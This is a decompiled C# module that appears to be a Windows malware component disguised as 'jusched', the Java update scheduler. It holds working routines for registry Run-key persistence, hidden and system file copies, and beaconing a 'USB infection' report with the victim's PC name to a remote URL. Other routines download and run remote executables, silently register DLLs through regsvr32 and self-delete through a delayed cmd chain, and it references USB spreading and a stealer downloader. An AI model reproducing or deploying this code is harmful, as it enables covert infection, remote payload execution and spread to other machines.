using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace jusched;

[StandardModule]
internal sealed class global_0
{
	public static void reg(string string_0, string string_1, string string_2)
	{
		object objectValue = RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey(string_0, writable: true)!.GetValue(string_1));
		try
		{
			if (objectValue == null)
			{
				Registry.CurrentUser.OpenSubKey(string_0, writable: true)!.SetValue(string_1, string_2);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void check_mypath()
	{
		try
		{
			string currentDirectory = Directory.GetCurrentDirectory();
			string directoryRoot = Directory.GetDirectoryRoot(currentDirectory);
			directoryRoot = Directory.GetDirectoryRoot("\\");
			DriveInfo driveInfo = new DriveInfo(directoryRoot);
			if (driveInfo.DriveType == DriveType.Removable && File.Exists(directoryRoot + Configuration.usbname))
			{
				webget(Configuration.info + "?xxx=USB infection from " + Configuration.pcname);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void copynhide(string string_0, string string_1)
	{
		try
		{
			if (File.Exists(string_1))
			{
				File.SetAttributes(string_1, FileAttributes.Normal);
				File.Delete(string_1);
			}
			File.Copy(string_0, string_1, overwrite: true);
			File.SetAttributes(string_1, FileAttributes.Hidden | FileAttributes.System);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void webget(string string_0)
	{
		try
		{
			WebRequest webRequest = WebRequest.Create(string_0);
			webRequest.Proxy = null;
			webRequest.GetResponse().GetResponseStream();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void updaterkill()
	{
		try
		{
			take.down.uOiXCHFkkjFociRWPEHsfPE();
			Usb.spread_0.Abort();
			string path = Environment.GetEnvironmentVariable("windir") + "\\Tasks\\JavaUpdater.job";
			if (File.Exists(path))
			{
				File.SetAttributes(path, (FileAttributes)0);
				File.Delete(path);
			}
			Registry.CurrentUser.DeleteSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" + Configuration.regname, throwOnMissingSubKey: true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		string[] processFiles = Configuration.ProcessFiles;
		foreach (string path2 in processFiles)
		{
			try
			{
				if (File.Exists(path2))
				{
					File.Delete(path2);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Install.appMutex.Close();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public static bool HasInternetConnection(ref string string_0)
	{
		Uri requestUri = new Uri(string_0);
		WebRequest webRequest = WebRequest.Create(requestUri);
		webRequest.Proxy = null;
		try
		{
			WebResponse response = webRequest.GetResponse();
			response.Close();
			webRequest = null;
			response.Close();
			webRequest = null;
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void DownloadAndExecuteUpdate(string string_0)
	{
		updaterkill();
		if (Conversions.ToBoolean(DownloadAndRun(string_0)))
		{
			Process.Start(Process.GetCurrentProcess().MainModule!.FileName);
		}
		Environment.Exit(0);
	}

	public static void updatestheal(string string_0)
	{
		if (Conversions.ToBoolean(Stealdownload.down(string_0)))
		{
			updaterkill();
		}
		Environment.Exit(0);
	}

	public static void wipe()
	{
		string path = Environment.GetEnvironmentVariable("windir") + "\\Tasks\\JavaUpdater.job";
		if (File.Exists(path))
		{
			File.SetAttributes(path, (FileAttributes)0);
			File.Delete(path);
		}
		try
		{
			Registry.CurrentUser.DeleteSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" + Configuration.regname, throwOnMissingSubKey: true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		string executablePath = Application.get_ExecutablePath();
		Process currentProcess = Process.GetCurrentProcess();
		Interaction.Shell("cmd.exe /c \"ping -n 30 127.0.0.1 >nul && taskkill /F /IM \"" + currentProcess.ProcessName + ".exe\" && ping -n 10 127.0.0.1 >nul && attrib -s -h -r \"" + executablePath + "\" && ping -n 15 127.0.0.1 >nul && del \"" + executablePath + "\"\"", (AppWinStyle)0, false, -1);
	}

	public static object DownloadAndRun(string string_0)
	{
		try
		{
			using WebClient webClient = new WebClient();
			webClient.Proxy = null;
			byte[] bytes = webClient.DownloadData(string_0);
			string text = Path.GetTempFileName() + RandomString(6) + ".exe";
			File.WriteAllBytes(text, bytes);
			Process.Start(text);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static string RandomString(int int_0)
	{
		Random random = new Random();
		string text = "abdcdefghijklmnopqrstuvwxyz123456789";
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < int_0; i = checked(i + 1))
		{
			stringBuilder.Append(text.Substring(random.Next(0, text.Length), 1));
		}
		return stringBuilder.ToString();
	}

	public static void Registar_Dlls(string string_0)
	{
		try
		{
			string arguments = "/s \"" + string_0 + "\"";
			Process process = new Process();
			process.StartInfo.FileName = "regsvr32.exe";
			process.StartInfo.Arguments = arguments;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			process.WaitForExit();
			process.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
